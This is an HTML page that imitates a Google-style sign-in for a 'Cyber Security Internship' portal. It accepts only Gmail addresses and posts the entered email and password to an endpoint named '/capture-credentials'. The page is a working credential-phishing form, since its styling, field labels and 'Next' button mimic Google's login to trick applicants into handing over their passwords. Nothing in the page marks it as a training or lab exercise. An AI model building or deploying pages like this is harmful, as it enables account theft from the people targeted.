<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Internship Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
    }

    .container {
      background-color: #ffffff;
      max-width: 400px;
      margin: 80px auto;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      padding: 40px 30px;
      text-align: center;
    }

    h1 {
      font-size: 20px;
      font-weight: 500;
      color: #1a73e8;
      margin-bottom: 10px;
    }

    h2 {
      font-weight: 400;
      font-size: 24px;
      color: #202124;
      margin-bottom: 20px;
    }

    .form-group {
      text-align: left;
      margin-top: 20px;
    }

    label {
      font-size: 0.95rem;
      color: #202124;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 1rem;
      outline: none;
    }

    input[type="submit"] {
      background-color: #1a73e8;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      font-size: 1rem;
      margin-top: 25px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #1765c1;
    }

    .footer-note {
      font-size: 0.8rem;
      color: #888;
      margin-top: 30px;
      line-height: 1.4;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Apply for Cyber Security Internship</h1>
    <h2>Sign in</h2>

    <form method="POST" action="/capture-credentials" onsubmit="return validateEmail()">
      <div class="form-group">
        <label for="email">Email or phone</label>
        <input type="text" id="email" name="email" required placeholder="you@gmail.com">
      </div>

      <div class="form-group">
        <label for="password">Enter your password</label>
        <input type="password" id="password" name="password" required>
      </div>

      <input type="submit" value="Next">
    </form>

  </div>

  <script>
    function validateEmail() {
      const emailInput = document.getElementById("email").value.trim();
      const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;

      if (!gmailPattern.test(emailInput)) {
        alert("Please enter a valid Gmail address (e.g. yourname@gmail.com).");
        return false;
      }
      return true;
    }
  </script>

</body>
</html>
